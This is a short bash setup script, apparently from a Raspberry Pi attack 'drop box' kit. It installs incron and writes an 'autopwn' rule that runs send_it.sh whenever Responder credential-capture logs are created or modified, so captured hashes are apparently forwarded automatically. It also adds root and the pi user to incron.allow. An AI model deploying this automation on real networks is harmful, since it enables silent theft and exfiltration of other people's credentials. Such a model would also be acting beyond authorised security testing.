#!/bin/bash
#apt-get update
#In future, we'll add an option to apt update on failure, but for now, I'm going to skip it - it keeps taking too long on tests
echo -e "${GREEN}[+] Installing incron and the config files"
apt-get install incron -y 

#inotifywait -m /usr/share/responder/logs/ -e create |
#    while read dir action file; do
#        ./send_it.sh
#    done
systemctl enable incron
echo "root" >> /etc/incron.allow
echo "pi" >> /etc/incron.allow
#If not pi, change to whatever your "regular" user is


#echo -e "/usr/share/responder/logs/*.txt IN_CREATE ${PWD}/send_it.sh \$#" >> /etc/incron.d/autopwn
echo -e "/usr/share/responder/logs/*.txt IN_CREATE,IN_MODIFY ${PWD}/send_it.sh" >> /etc/incron.d/autopwn
echo -e "${GREEN}[*] Done Installing incron and the config files"
